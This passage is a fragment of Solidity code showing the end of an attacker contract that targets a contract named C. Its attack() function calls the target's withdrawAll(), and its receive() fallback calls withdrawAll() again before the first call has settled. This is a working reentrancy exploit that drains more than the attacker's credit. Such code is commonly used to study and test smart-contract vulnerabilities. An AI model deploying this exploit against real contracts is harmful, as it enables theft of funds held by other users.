    bool private reentered;

    constructor(C _target) {
        target = _target;
    }

    function attack() external payable {
        target.withdrawAll();
    }

    receive() external payable {
        if (!reentered && address(target).balance >= target.credit(address(this))) {
            reentered = true;
            target.withdrawAll();
            reentered = false;
        }
    }
}

